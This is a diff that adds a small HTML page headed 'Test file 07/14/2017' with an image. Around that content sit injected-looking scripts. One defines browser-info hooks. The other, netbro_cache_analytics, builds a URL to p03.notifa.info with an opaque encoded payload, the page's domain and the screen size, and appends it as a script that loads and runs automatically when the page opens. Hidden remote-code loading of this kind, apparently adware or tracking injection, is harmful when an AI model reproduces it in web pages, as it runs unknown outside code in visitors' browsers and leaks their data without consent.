@@ -1,0 +1,13 @@
+<html>
+<body>
+
+<script type="text/javascript" charset="utf-8">
+;window.__TIMESFROMCLIENT__=0;window.__USERLOGICINFO__='running';window.__BROWSERINFOMAP__={};window.__BROWSERINFOSETSTATUSMAP__={};function IsUserLogicOver(){for(var i=0;i<arguments.length;i++){var s=arguments[i].indexOf("#=#");window.__BROWSERINFOMAP__[arguments[i].substring(0,s)]=arguments[i].substring(s+3)}window.__TIMESFROMCLIENT__++;for(var key in window.__BROWSERINFOSETSTATUSMAP__){window.__BROWSERINFOSETSTATUSMAP__[key]=1}return window.__USERLOGICINFO__}function SetBrowserInfo(key,val,callback){if(window.__USERLOGICINFO__.indexOf("set:")>=0)window.__USERLOGICINFO__+="&"+key+"="+val;else window.__USERLOGICINFO__="set:"+key+"="+val;var set_status_flag=""+key+(new Date()).getTime();window.__BROWSERINFOSETSTATUSMAP__[set_status_flag]=0;var max_wait_times=4,wait_times=0;var id=setInterval(function(){var success=false;if(window.__BROWSERINFOSETSTATUSMAP__[set_status_flag]===1){success=true}if(success||(++wait_times)>=max_wait_times){clearInterval(id);callback&&callback(success)}},500)}function GetBrowserInfo(key){return window.__BROWSERINFOMAP__[key]}function StopUserLogic(){window.__USERLOGICINFO__='over'}
+</script>
+
+<img src="sailing.gif">
+<p></p>
+<h1>Test file 07/14/2017</h1>
+<p></p>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mKmCSoszC18VDyrhzLnYLoyiT8Ywlup4MCi7D%2fejgDoBdvF3rybm2J4rS1SbMxUrGcDghQmD%2fT%2bpX41pT9vTp59nnrWvIrLuetRJ49STQHucNo%2bIMn6elrZ3eXlxT36jQObmZjc%2fscQAdVfv%2fphlN%2b73WgwQIhgVlTFcEe6ytXyThzsm5QmY4dbzhFHqk3fs3qYowxyTfq2iDONWDJcA4C4eGLtXrVl8NcBFe%2bNofqUNxsVmD2RLU0%2f85l80YppxplAdPlIQN1B3ApjctZ90WCTWnQc%2fOKzqERKuZwMdAmlG0uccXpYITFVTXxrsIuO%2biuvXTHvVAckrIWN%2fLaNaxU2rimNePgb%2bMg%2fJUVb%2behNJ1a5%2bF6wf7nhBweqigM0xGDvz30USqKpvTO%2fiovjLUhF%2fFCfT0n8M%2boivmzxautsXyE6bWAErqPldtWvpS9WWFyqhPxrRm%2b3gb8ep7J%2fQKL4pbv2w5bRldYNjN%2fkm9rjaM%2f%2bK6NMvw6iiVWAsG38W2f%2bjYkvaaOHCsoAhjdI8apeKk0Y52LhvWUhSfARpbNbDE2DXnBMDP80CiOZ7M9x3Hi%2f%2b%2f0DiJZYM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
